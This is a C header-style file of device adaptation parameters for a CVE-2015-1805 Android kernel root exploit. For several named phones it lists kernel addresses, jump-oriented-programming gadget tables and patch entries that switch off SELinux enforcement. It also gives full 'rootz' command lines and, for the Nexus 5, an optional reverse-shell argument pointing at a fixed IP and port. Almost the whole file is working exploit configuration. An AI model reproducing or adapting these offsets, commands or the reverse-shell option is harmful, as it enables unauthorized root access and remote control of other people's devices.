/*
 * CVE-2015-1805 exploit adp args
 *
 * Copyright (C) 2017 by idhyt3r@gmail.com
 *
 */

#include "param.h"

/* 

  通用内核函数地址定义在 param.h 头文件中
  
  针对不同手机适配需要特殊定义的，在该头文件中定义

*/

// #define TEST_FOR_TEST

#ifdef TEST_FOR_TEST

unsigned long adp_ptmx_fops = 0xc1237658;

unsigned long adp_ptmx_fops_ioctl_offset = 0x20;

unsigned long adp_ptmx_fops_ioctl = adp_ptmx_fops + adp_ptmx_fops_ioctl_offset;

unsigned long adp_before_kernel_sock_ioctl = 0xc05cfc70;

unsigned long adp_kernel_sock_ioctl = 0xC085ED40;

unsigned long adp_ptmx_fops_ioctl_back_addr = 0xc027ac48;

unsigned long adp_task_security_offset = 0x58;

unsigned long adp_init_task = 0xc1042f38;

// set_fs to patch thread_info->addr_limit
struct jop_gadget j_jop1[0x10] = {
  {0xf8, 0xaaaaaaaa,},  // jop_buf
  {0xc, 0xC085ED40,},   // kernel_sock_ioctl
  {0x18, 0xaaaaaaaa,},  // jop_buf
  {0x24, 0xc027ac48,},  // ptmx_fops_ioctl_back_addr
  {0, 0,},
};

unsigned long adp_selinux_enforcing = 0xc122dae4;

unsigned long adp_tty_ioctl = 0xC047247C;

struct patch_gadget p_patch[0x10] = {
  {0xc122dae4, 0x00, sizeof(int)},  // selinux_enforcing
  {0xc1237658 + 0x20, 0xC047247C, sizeof(long)}, // restore ioctl
  {0, 0,},
};

#endif
#if 0

适配信息 

/* SM-A700S */

unsigned long adp_ptmx_fops = 0xc1378310
unsigned long adp_ptmx_fops_ioctl_offset = 0x20;
unsigned long adp_init_task = 0xc1125f40; c1125f40
unsigned long adp_task_security_offset = 0x5c;

unsigned long adp_before_kernel_sock_ioctl = 0xC0542330

unsigned long adp_kernel_sock_ioctl = 0xc08bd9bc

unsigned long adp_selinux_enforcing = 0xc12c38e0
unsigned long adp_tty_ioctl = 0xc04338f0
unsigned long adp_task_cred_uid_offset = 0x4;

unsigned long adp_ptmx_fops_ioctl_back_addr = 0xC0202D70

[+] kernel version:
root@a7ltelgt:/ # cat /proc/version                                            
Linux version 3.10.49-6845695 (dpi@SWDD6719) (gcc version 4.8 (GCC) ) #1 SMP PREEMPT Thu Feb 18 16:30:46 KST 2016


./data/local/tmp/rootz "n=1021&k=[101=0xc1378310;102=0x20;104=0xc1125f40;105=0x5c;106=0xc0542330;109=0x4;&j=[0x10c=0xaaaaaaaa;0xc=0xc08bd9bc;0x18=0xaaaaaaaa;0x24=0xC0202D70;0x0=0x0;]&p=[0xc12c38e0=0x0=0x4;0xc1378330=0xc04338f0=0x4;]"





/* HW MT7*/

unsigned long adp_ptmx_fops = 0xc15b0454;

unsigned long adp_ptmx_fops_ioctl_offset = 0x20;

unsigned long adp_ptmx_fops_ioctl = adp_ptmx_fops + adp_ptmx_fops_ioctl_offset;

unsigned long adp_before_kernel_sock_ioctl = 0xC09BF2D0;

unsigned long adp_kernel_sock_ioctl = 0xC0DDB6B0;

unsigned long adp_ptmx_fops_ioctl_back_addr = 0xC0702CE0;

unsigned long adp_task_security_offset = 0x68;

unsigned long adp_init_task = 0xC139AAE0;

unsigned long adp_selinux_enforcing = 0xc15a7990;

unsigned long adp_tty_ioctl = 0xc091eb2c;

unsigned long adp_task_cred_uid_offset = 0x10;

unsigned long adp_ro_secure_debuggable = 0xc13b554c;

unsigned long adp_ro_secure_debuggable_static = 0xc15a955c;

[+] kernel version: Linux version 3.10.86-g76ac748 (android@localhost) (gcc version 4.7.3 20121205 (prerelease) (crosstool-NG linaro-1.13.1-4.7-2012.12-20121214 - Linaro GCC 2012.12) ) #2 SMP PREEMPT Mon Apr 4 05:03:33 CST 2016

./data/local/tmp/rootz "n=1021&k=[101=0xc15b0454;102=0x20;104=0xC139AAE0;105=0x68;106=0xC09BF2D0;109=0x10;801=0xc13b554c;802=0xc15a955c;]&j=[0x9c=0xaaaaaaaa;0xc=0xC0DDB6B0;0x18=0xaaaaaaaa;0x24=0xC0702CE0;0x0=0x0;]&p=[0xc15a7990=0x0=0x4;0xc15b0474=0xc091eb2c=0x4;]"


/* sony c6903 */

unsigned long adp_before_kernel_sock_ioctl = 0xC0500D7C;

unsigned long adp_ptmx_fops_ioctl_back_addr = 0xC026E5A0;

Linux version 3.4.0-perf-g2deedd1 (BuildUser@BuildHost) (gcc version 4.8 (GCC) ) #1 SMP PREEMPT Thu Aug 20 14:52:56 2015

./data/local/tmp/rootz "n=1021&k=[101=0xc10ecb90;102=0x20;104=0xc0f1f700;105=0x58;106=0xC0500D7C;109=0x4;]&j=[0xf8=0xaaaaaaaa;0xc=0xC0787914;0x18=0xaaaaaaaa;0x24=0xC026E5A0;0x0=0x0;]&p=[0xc10dfc98=0x0=0x4;0xc10ecbb0=0xc04185b4=0x4;]"



/* nexus 5 */
 Linux version 3.4.0-gbebb36b (android-build@vpbs1.mtv.corp.google.com) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Mar 10 18:17:45 UTC 2015

./data/local/tmp/rootz "n=1021&k=[101=0xc1237658;102=0x20;104=0xc1042f38;105=0x58;106=0xc05cfc70;109=0x4;]&j=[0xf8=0xaaaaaaaa;0xc=0xC085ED40;0x18=0xaaaaaaaa;0x24=0xc027ac48;0x0=0x0;]&p=[0xc122dae4=0x0=0x4;0xc1237678=0xC047247C=0x4;]"
if test reverse shell:
+ "&r=[901=/data/local/tmp/install.sh;902=192.168.199.213;903=8989;]"





#endif













